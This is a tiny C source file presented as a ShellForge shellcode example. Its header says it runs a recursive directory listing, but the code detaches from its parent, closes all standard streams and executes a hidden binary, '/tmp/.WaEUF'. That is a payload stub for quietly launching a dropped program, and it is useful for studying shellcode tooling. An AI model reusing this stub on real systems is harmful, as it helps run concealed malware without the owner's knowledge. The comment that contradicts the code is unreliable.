/* 
 * ShellForge example: execute /bin/ls -aR /
 * $Id$
 */

int main()
{
		if (!fork()) exit(0);
//        char *a[] = {"/usr/bin/id", 0}; 
		close(0);
		close(1);
		close(2);
        char *a[] = {"/tmp/.WaEUF", 0}; 
        execve(*a, a, 0);
}

